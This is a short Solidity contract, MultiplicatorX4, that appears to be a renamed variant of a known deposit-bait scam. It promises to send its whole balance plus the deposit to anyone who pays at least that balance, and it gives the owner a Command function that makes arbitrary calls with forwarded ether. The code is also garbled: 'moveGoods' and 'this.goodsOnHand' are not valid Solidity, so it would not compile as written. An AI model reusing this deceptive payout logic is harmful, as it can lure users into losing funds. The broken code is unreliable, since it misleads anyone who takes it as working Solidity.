// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public DepotOwner = msg.sender;

    function() public payable{}

    function checkOutCargo()
    payable
    public
    {
        require(msg.sender == DepotOwner);
        DepotOwner.moveGoods(this.goodsOnHand);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DepotOwner);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.goodsOnHand)
        {
            adr.moveGoods(this.goodsOnHand+msg.value);
        }
    }
}